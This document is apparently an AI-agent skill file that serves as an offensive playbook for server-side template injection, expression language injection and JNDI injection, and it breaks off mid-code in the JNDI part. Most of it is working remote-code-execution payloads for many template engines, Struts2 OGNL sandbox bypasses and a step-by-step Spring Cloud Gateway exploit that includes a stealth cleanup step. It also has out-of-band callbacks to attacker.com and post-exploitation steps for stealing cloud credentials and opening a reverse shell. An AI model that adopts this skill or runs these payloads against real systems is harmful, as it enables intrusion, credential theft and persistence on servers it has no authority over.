---
name: injection-server
description: >-
  Server-side expression/template injection chain. Covers SSTI (15+ engines: Jinja2/Twig/Pebble/Mako/EJS/Handlebars with fingerprinting and RCE), Expression Language injection (SpEL/OGNL/Java EL), JNDI injection (Log4Shell patterns/JDK version bypass/RMI-LDAP chains), and XSLT injection (document() file read, system-property fingerprinting, PHP registerPHPFunctions / Saxon Java extensions / .NET msxsl:script RCE). Load when template expressions, JNDI lookups, or XSLT transformations process attacker input.
---

# Server-Side Injection — Templates, EL & JNDI

## Internal Navigation
| Part | Content |
|---|---|
| 1 | SSTI Core |
| 2 | Engine-Specific Payloads |
| 3 | Expression Language Injection |
| 4 | JNDI Injection |
| 5 | XSLT Injection |

---
# Part 1: SSTI Core


# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Before using full engine-specific exploitation, you can first load:

- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting
- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Maccms 8.x PHP template `eval` — `{if-A:phpinfo()}{endif-A}` in `vod-search`, base64 bypass for webshell write
- Jira CVE-2019-11581 — "Contact Administrators" form → Velocity template injection → command output in admin email
- Spring Cloud Gateway SpEL (CVE-2022-22947) — actuator route injection with `StreamUtils.copyToByteArray` for output capture
- Struts2 OGNL S2-045 (CVE-2017-5638) — Content-Type header OGNL injection with `_memberAccess` / `OgnlUtil` blacklist clear
- Confluence OGNL CVE-2021-26084 — `createpage-entervariables.action` with `\u0027` unicode bypass
- SSTI vs EL injection disambiguation guide
- Additional template engines: ASP.NET Razor, Elixir EEx, PHP Smarty/Latte/Blade, JS Pug/Handlebars/Nunjucks/EJS/Lodash + universal detection + blind SSTI + Flask PIN calculation

**SCENARIOS.md reference (§7–§11):** For expanded payloads and engine-specific notes on Razor, EEx/LEEx/HEEx, PHP stacks, JavaScript template engines, the universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean / time / OOB), and Flask debug PIN prerequisites, see [SCENARIOS.md](./SCENARIOS.md). This skill keeps a short checklist in §13–§15.

### Engine Payloads Reference

For extended engine-specific fingerprinting, payload matrices (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Slim, Handlebars, Thymeleaf, Smarty, ERB, Jade/Pug), and blind SSTI detection techniques (timing-based, DNS-based), see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).

### Universal detection & blind SSTI (pointer)

Use the polyglot payload and math probes in §1 and §13 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow [SCENARIOS.md](./SCENARIOS.md) §11 and cross-check §14 here for technique names (boolean, time, OOB, error-based).


## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 vs Twig disambiguation**:
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)
```

**Safe detection probe** (no math, just boolean):
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: `os` module via `__globals__`
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Chain 2: MRO subclass traversal (sandbox escape)
```python
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### Chain 3: `request` object globals (works when `config` blocked)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
(Uses hex encoding to avoid `_` filtering)

### Chain 4: `lipsum` function globals (Flask built-in)
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### Chain 5: `cycler` object
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Finding correct subprocess index dynamically:
```python
# In injection:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### When `_` (underscore) is blocked:
```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### When `.` (dot) is blocked:
```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
```

### When keywords (class, mro) are blocked:
Use hex/unicode in `attr()`:
```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### When output encoding strips HTML entities:
Use `|safe` filter to prevent auto-escaping.

---

## 5. FREEMARKER (JAVA) — RCE

### Execute Command via freemarker.template.utility.Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Alternative via ObjectConstructor:
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x (before sandbox):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x using built-ins:
{{['id']|map('system')|join}}

// via filter map:
{{app.request.server.all|join(',')}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

Or more directly:
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY RAILS) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

Thymeleaf with Spring EL (SpEL):
```java
// In th:text or th:fragment context:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment expression context:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

When AngularJS is used client-side and user data flows into template expressions:

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Detection**: send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions in the DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() 
│           OR subclass traversal for Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**Post-RCE pivot**:
1. Read `/proc/self/environ` — env vars with credentials
2. Read application config files — DB passwords, API keys
3. `cat ~/.aws/credentials` — cloud credentials
4. Reverse shell for persistence

---

## 12. COMMON INJECTION ENTRY POINTS

Where user data enters templates:
- URL path: `https://site.com/home?name={{7*7}}`
- Query parameters: `?message=Hello`
- HTML forms: profile name, bio, content fields
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates: name in password reset emails
- Inline template rendering: `render_template_string(user_input)`

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 13. UNIVERSAL DETECTION PAYLOADS

**Polyglot probe** that triggers errors or evaluation in many engines:

```
${{<%[%'"}}%\.
```

**Mathematical probes** for blind/error confirmation:

```
{{7*7}}          → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}           → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>       → 49 (ERB, EJS, EEx)
#{7*7}           → 49 (Pug, Ruby interpolation)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**Error-based engine fingerprint** (parser/stack traces often name the engine):

```
(1/0).zxy.zxy
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` — if the first resolves and the second errors, evaluation is likely
- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay
- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible
- **Error-based**: Force different error messages based on true/false conditions

---

## 15. FLASK PIN CALCULATION

When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:

1. **`username`** — from `/etc/passwd` (the user running the Flask process)
2. **Module name** — often `flask.app` or `Flask`
3. **Application path** — `app.py` or the real main filename
4. **MAC address** — e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug’s algorithm
6. **Compute PIN** — use established open-source PIN calculators that implement the same algorithm from these values

> Use only on systems you are authorized to test; obtaining these values implies prior access or an additional info-disclosure vector.


---
# Part 2: Engine-Specific Payloads


## 1. ENGINE FINGERPRINTING DECISION TREE

```text
Send: {{7*7}}
├── 49 → Jinja2 or Twig?
│   └── Send: {{7*'7'}}
│       ├── 7777777 → Jinja2 (Python string multiplication)
│       └── 49      → Twig (PHP numeric cast)
├── {{7*7}} (literal) → Not Jinja2/Twig, try others
│   └── Send: ${7*7}
│       ├── 49 → FreeMarker, Velocity, or EL?
│       │   └── Send: ${class.getClass()}
│       │       ├── Works → Velocity
│       │       └── Error → Send: <#assign x=1>${x}
│       │           ├── 1     → FreeMarker
│       │           └── Error → Java EL / Thymeleaf
│       └── ${7*7} (literal) → try #{7*7}, <%= 7*7 %>, {7*7}
│           ├── #{7*7} → 49 → Pug/Jade or Ruby interpolation
│           ├── <%= 7*7 %> → 49 → ERB (Ruby) or EJS (Node.js)
│           └── {7*7} → 49 → Smarty (PHP)
└── Error/500 → Check error message for engine name (stack trace fingerprint)
```


## 2. JINJA2 (PYTHON)

### Information disclosure

```python
{{config}}
{{config.items()}}
{{request.environ}}
{{request.application.__globals__}}
{{self.__dict__}}
{{[].__class__.__base__.__subclasses__()}}
```

### RCE chains

```python
# Via config globals
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum (Flask built-in)
{{lipsum.__globals__.os.popen('id').read()}}

# Via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Via namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Via __import__ through builtins
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# MRO subclass traversal (universal, no Flask dependency)
# Step 1: Find Popen class index
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}{{loop.index0}}{% endif %}
{% endfor %}
# Step 2: Execute (replace INDEX)
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

### Sandbox bypass when `_` is blocked

```python
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{{''['\x5f\x5fclass\x5f\x5f']}}
{{config|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Via request.args to smuggle blocked keywords
{{request.args.x.__class__}}&x=1
# Via request.cookies
{{request.cookies.get('\x5f\x5fclass\x5f\x5f')}}
```

### Sandbox bypass when `.` is blocked

```python
{{config['SECRET_KEY']}}
{{''['__class__']['__mro__'][1]}}
{{()|attr('__class__')}}
```

---

## 3. TWIG (PHP)

### Information disclosure

```twig
{{_self}}
{{_self.env}}
{{_context}}
{{app.request.server.all|join(',')}}
{{app.request.cookies.all|join(',')}}
```

### RCE chains

```twig
{# Twig 1.x #}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{# Twig 1.x — system() #}
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

{# Twig 2.x/3.x via filter map #}
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|map('exec')|join}}

{# Twig 2.x — reduce with passthru #}
{{[0]|reduce('system','id')}}

{# Twig — setCache for remote include (Twig 1.x) #}
{{_self.env.setCache("ftp://attacker.com/")}}
{{_self.env.loadTemplate("shell")}}
```

---

## 4. FREEMARKER (JAVA)

### RCE via Execute

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
```

### RCE via ObjectConstructor

```freemarker
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",
  ob("java.io.InputStreamReader",
    ob("java.lang.ProcessBuilder",["id"]).start().getInputStream()))>
${br.readLine()}
```

### RCE via JythonRuntime (if Jython available)

```freemarker
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os; os.system("id")</@jr>
```

### File read

```freemarker
<#assign file=object("java.io.File","/etc/passwd")>
<#assign reader=object("java.util.Scanner",file)>
${reader.useDelimiter("\\A").next()}
```

---

## 5. VELOCITY (JAVA)

### RCE chains

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

### Alternative via ClassTool

```velocity
#set($proc=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
#set($reader=$class.inspect("java.io.BufferedReader").type.getDeclaredConstructor(
  $class.inspect("java.io.Reader").type).newInstance(
  $class.inspect("java.io.InputStreamReader").type.getDeclaredConstructor(
    $class.inspect("java.io.InputStream").type).newInstance($proc.getInputStream())))
$reader.readLine()
```

---

## 6. PEBBLE (JAVA)

```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
    .forName('java.lang.Runtime')
    .methods[6]
    .invoke(null,null)
    .exec(cmd)
    .inputStream
    .readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String')
    .getDeclaredConstructors()[0]
    .newInstance(([bytes]) ) }}
```

Alternative (shorter):
```pebble
{{ (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec("id") }}
```

---

## 7. MAKO (PYTHON)

```mako
${self.module.cache.util.os.popen('id').read()}
```

Alternative chains:
```mako
<%
  import os
  x = os.popen('id').read()
%>
${x}

<%
  import subprocess
  x = subprocess.check_output(['id'])
%>
${x}
```

Mako executes Python code directly within `<% %>` blocks — no sandbox to escape.

---

## 8. SLIM (RUBY)

```slim
#{`id`}
#{ system('id') }
#{ IO.popen('id').read }
#{ File.read('/etc/passwd') }
```

Slim and Haml support Ruby interpolation in `#{ }` blocks — same as ERB `<%= %>`:
```slim
= `id`
= system('whoami')
```

---

## 9. HANDLEBARS (NODE.JS)

Handlebars is "logic-less" by design, but prototype pollution or helper registration can enable RCE:

### RCE via constructor access

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Information leak

```handlebars
{{this}}
{{this.constructor}}
{{#each this}}{{@key}}: {{this}}{{/each}}
```

---

## 10. THYMELEAF (JAVA / SPRING)

### SpEL-based RCE

```java
// In fragment selector context
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// With output capture
__${T(org.apache.commons.io.IOUtils).toString(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/sh","-c","id"}).getInputStream()
)}__::.x

// In th:text or th:utext attribute
${T(java.lang.Runtime).getRuntime().exec('id')}

// URL-based injection (Spring view name resolution)
GET /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### Pre-processing expression `__${...}__`

Thymeleaf pre-processes `__${expr}__` before template rendering — this is the primary injection vector when view names are user-controlled.

### File read via SpEL

```java
${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}
```

---

## 11. SMARTY (PHP)

```smarty
{system('id')}
{exec('id')}
{passthru('id')}
{php}system('id');{/php}

{# Smarty 3.x — {php} tags disabled by default, use: #}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}

{# Information disclosure #}
{$smarty.version}
{$smarty.template}
{$smarty.server.SERVER_NAME}
```

---

## 12. ERB (RUBY)

```erb
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>
<%= open('|id').read %>
<%= %x(id) %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
```

ERB has no sandbox — any Ruby code executes directly.

---

## 13. JADE / PUG (NODE.JS)

```pug
#{root.process.mainModule.require('child_process').execSync('id')}

- var x = root.process.mainModule.require('child_process').execSync('id').toString()
p= x

#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### File read

```pug
- var fs = root.process.mainModule.require('fs')
p= fs.readFileSync('/etc/passwd','utf8')
```

---

## 14. BLIND SSTI DETECTION

When template output is not directly visible in the response:

### Timing-based

```text
# Jinja2
{{range(10000000)|list}}                    → CPU spike / slow response
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('sleep 5',shell=True)}}

# Twig
{{['sleep 5']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# Velocity
#set($x=''.class.forName('java.lang.Runtime').getRuntime().exec('sleep 5'))

# ERB
<%= sleep(5) %>

# Smarty
{system('sleep 5')}
```

Compare response time: baseline vs payload. 5+ second delta = confirmed blind SSTI.

### DNS-based (OOB)

```text
# Jinja2
{{lipsum.__globals__.os.popen('nslookup TOKEN.attacker.com').read()}}

# Twig
{{['nslookup TOKEN.attacker.com']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup TOKEN.attacker.com")}

# ERB
<%= `nslookup TOKEN.attacker.com` %>

# Pug/Jade
#{root.process.mainModule.require('child_process').execSync('nslookup TOKEN.attacker.com')}
```

DNS hit on Burp Collaborator / interactsh = confirmed blind SSTI with RCE.

### Error-based fingerprinting

Force a parser error — the error message or stack trace often names the engine:

```text
${{<%[%'"}}%\.
```

Parse errors from different engines:
- `jinja2.exceptions.TemplateSyntaxError` → Jinja2
- `Twig\Error\SyntaxError` → Twig
- `freemarker.core.ParseException` → FreeMarker
- `org.apache.velocity.exception.ParseErrorException` → Velocity
- `SyntaxError` with Pug stack → Pug/Jade


---
# Part 3: Expression Language Injection


# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.

## 0. RELATED ROUTING

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) — different attack surface
- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.


## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```


---
# Part 4: JNDI Injection


# SKILL: JNDI Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert JNDI injection techniques. Covers lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets. Base models often confuse JNDI injection with general deserialization — this file clarifies the distinct attack surface.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation


## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
